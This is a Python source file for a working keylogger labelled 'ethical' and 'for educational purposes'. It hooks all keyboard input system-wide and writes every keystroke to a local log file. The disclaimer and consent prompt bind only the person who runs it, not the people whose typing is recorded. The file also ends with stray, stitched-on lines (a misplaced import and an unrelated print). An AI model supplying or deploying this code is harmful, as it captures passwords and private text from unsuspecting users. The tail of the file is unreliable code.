import keyboard
import time
from datetime import datetime

class EthicalKeylogger:
    def __init__(self, log_file="keylog.txt", report_interval=60):
        self.log_file = log_file
        self.report_interval = report_interval
        self.start_time = time.time()
        self.log = ""
        
        # Create header in log file
        with open(self.log_file, "a") as f:
            f.write(f"\n\n=== Keylogger Session Started: {datetime.now()} ===\n")
    
    def callback(self, event):
        """Process key events"""
        key = event.name
        
        # Handle special keys
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            elif key == "decimal":
                key = "."
            else:
                key = f"[{key.upper()}]"
        
        self.log += key
        
        # Check if it's time to write to file
        if time.time() - self.start_time > self.report_interval:
            self.write_to_file()
    
    def write_to_file(self):
        """Write captured keys to file"""
        with open(self.log_file, "a") as f:
            f.write(self.log)
        self.log = ""
        self.start_time = time.time()
    
    def start(self):
        """Start the keylogger"""
        keyboard.on_release(callback=self.callback)
        print(f"Keylogger started. Logging to {self.log_file}")
        keyboard.wait()

if __name__ == "__main__":
    # Disclaimer
    print("""
    ETHICAL KEYLOGGER - FOR EDUCATIONAL PURPOSES ONLY
    This tool is for cybersecurity education and portfolio demonstration.
    Using keyloggers without proper authorization is illegal.
    """)
    
    # Get user consent
    consent = input("Do you understand and agree to use this only ethically? (yes/no): ")
    if consent.lower() != "yes":
        print("Exiting...")
        exit()
    
    # Initialize and start keylogger
    keylogger = EthicalKeylogger()
    try:
        keylogger.start()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user")
    finally:
        # Save any remaining logs
        if keylogger.log:
            keylogger.write_to_file()
            import keyboard
print("Module loaded successfully!")